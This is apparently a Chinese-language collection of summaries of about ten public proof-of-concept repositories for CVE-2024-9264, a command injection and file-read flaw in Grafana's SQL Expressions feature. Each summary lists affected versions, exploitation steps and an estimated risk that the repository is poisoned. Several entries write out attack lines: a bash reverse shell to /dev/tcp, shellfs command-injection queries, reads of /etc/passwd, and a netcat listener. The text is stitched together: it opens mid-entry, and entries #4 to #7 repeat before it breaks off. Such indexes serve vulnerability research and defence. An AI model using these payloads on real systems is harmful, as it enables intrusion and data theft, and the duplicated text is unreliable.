**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

# CVE-2024-9264

> 📦 该CVE有 **10** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-9264-Cythonic1_CVE-2024-9264.md](../2024/CVE-2024-9264-Cythonic1_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2)

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中。需要具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 duckdb 查询。由于输入未经过充分的过滤，导致可以进行命令注入和本地文件包含。攻击者需要拥有 Viewer 或更高权限才能利用此漏洞。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞被认为是高危的，并且已经存在公开的PoC代码。PoC代码验证了可以通过构造恶意的SQL表达式来读取任意文件。

**投毒风险分析：**
提供的 PoC 代码的主要功能是模拟登录 Grafana，然后构造包含恶意文件路径的 SQL 表达式，发送给 Grafana 服务器，以此来读取服务器上的文件。没有发现明显的投毒代码，例如反弹shell，添加用户等恶意操作。因此，投毒风险较低。

**利用方式：**
1.  **登录:** 使用有效的 Grafana 用户凭据（Viewer 或更高权限）进行身份验证。
2.  **构造Payload:** 构造包含恶意`duckdb` SQL查询的JSON Payload。该查询使用`read_csv_auto`函数读取目标文件，例如`/etc/passwd`。
3.  **发送请求:**  将构造的 Payload 发送到 `/api/ds/query` 端点，并指定 `ds_type=__expr__`。
4.  **执行和信息泄露:** Grafana 执行恶意 `duckdb` 查询，导致读取指定文件内容，攻击者从响应中获取敏感信息。

**项目地址:** [Cythonic1/CVE-2024-9264](https://github.com/Cythonic1/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #2

**来源**: [CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md](../2024/CVE-2024-9264-Exerrdev_CVE-2024-9264-Fixed.md)

## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #3

**来源**: [CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md](../2024/CVE-2024-9264-Royall-Researchers_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 高危，可能导致系统完全控制和敏感数据泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.0 <= version < 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.0 <= version < 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.0 <= version < 11.2.2

**利用条件:** 需要开启SQL Expressions实验性功能, DuckDB二进制文件在Grafana的PATH中, 具有Viewer或更高权限的已认证Grafana用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 是 Grafana 中 SQL Expressions 功能的一个远程代码执行漏洞。攻击者可以利用 DuckDB 查询中不足的输入验证，通过注入恶意命令，实现远程代码执行和本地文件包含。PoC 代码通过构造包含反向 shell 命令的 SQL 查询，然后通过 Grafana API 执行该查询。 该漏洞利用依赖于 `shellfs` 社区扩展，利用方式为安装并加载该扩展以执行命令。

**利用方式：**
1.  **身份验证：** 使用 Viewer 或更高权限的账户登录 Grafana。
2.  **构造恶意 SQL 查询：**  构造包含 shellfs 扩展安装和加载，以及反向 shell 命令的 SQL 查询语句。
3.  **发送 API 请求：**  通过 Grafana 的 API 发送包含恶意 SQL 查询的 POST 请求。
4.  **触发反向 Shell：**  执行已构造好的反向 shell 脚本，从而建立反向 shell 连接。

**投毒风险分析：**
PoC 代码本身旨在利用漏洞，没有明显的恶意行为，但是无法排除在真实攻击场景中攻击者添加额外的恶意代码的可能性。PoC代码中安装和加载`shellfs`扩展，并执行反向shell，这是一个完整的漏洞验证流程。如果作者在安装`shellfs`扩展之前或之后，插入额外的命令，可能会存在投毒行为，例如：安装后门，收集用户信息等。 此处判断投毒风险为10%的原因在于，用户可以自行检查代码并根据需要修改反向shell的命令，从而避免被作者投毒。

**有效性：**
该 PoC 代码有效，可以验证 CVE-2024-9264 漏洞的存在，并演示如何利用该漏洞实现远程代码执行。多个搜索结果表明此漏洞是一个严重的安全问题，并且存在可利用的 PoC。

**项目地址:** [Royall-Researchers/CVE-2024-9264](https://github.com/Royall-Researchers/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #4

**来源**: [CVE-2024-9264-nollium_CVE-2024-9264.md](../2024/CVE-2024-9264-nollium_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和文件包含

**影响应用:** Grafana

**危害等级:** 严重，可导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (小于 11.0.5, 11.1.6, 11.2.1, 11.0.6, 11.1.7, 11.2.2 +security-01)

**利用条件:** 需要Grafana SQL Expressions实验性功能启用，且攻击者需要具有Viewer或更高权限。目标系统需要安装DuckDB且位于系统PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 功能中。攻击者可以利用此漏洞执行命令注入和本地文件包含攻击。漏洞的利用方式是，Grafana 对用户提供的 duckdb 查询输入没有进行充分的过滤，导致攻击者可以通过构造恶意的 SQL 语句，执行任意命令或读取本地文件。

**有效性：**
根据漏洞信息、搜索结果和提供的 PoC 代码，该漏洞利用是有效的。PoC 代码已经提供了读取任意文件(`/etc/passwd`)和执行命令的功能，并且搜索结果中也表明存在公开的 PoC。

**投毒风险：**
PoC 代码本身具有一定的风险，可能被用于非法目的。此外，从代码分析来看，存在一定的投毒风险，因为代码的功能包括执行任意命令，这意味着攻击者可以下载并执行其他恶意脚本，从而控制受害者系统。但是当前提供的POC代码只包含文件读取和命令执行功能，未发现明显的后门或恶意代码。因此我倾向于认为投毒风险为10%。

**利用方式：**
1.  攻击者需要拥有 Grafana 的 Viewer 或更高权限。
2.  Grafana 必须启用 SQL Expressions 实验性功能。
3.  目标系统必须安装 DuckDB，并且位于系统 PATH 中。
4.  攻击者通过构造恶意的 duckdb 查询语句，利用 `read_blob` 函数读取任意文件，或者利用 shellfs 执行命令。
    *   读取文件示例：`SELECT content FROM read_blob('/etc/passwd')`
    *   执行命令示例：`SELECT * FROM read_csv('whoami > /tmp/output.txt 2>&1 |')`，然后读取 `/tmp/output.txt` 来获取命令执行结果。

**排序优先级理由：**
搜索引擎结果优先级最高，因为可以直接获取到该漏洞的概要信息，利用条件，利用方式等。其次是漏洞利用代码，利用代码验证了漏洞是真实可用的。最后是漏洞库信息，是对漏洞最基础的描述。

**项目地址:** [nollium/CVE-2024-9264](https://github.com/nollium/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

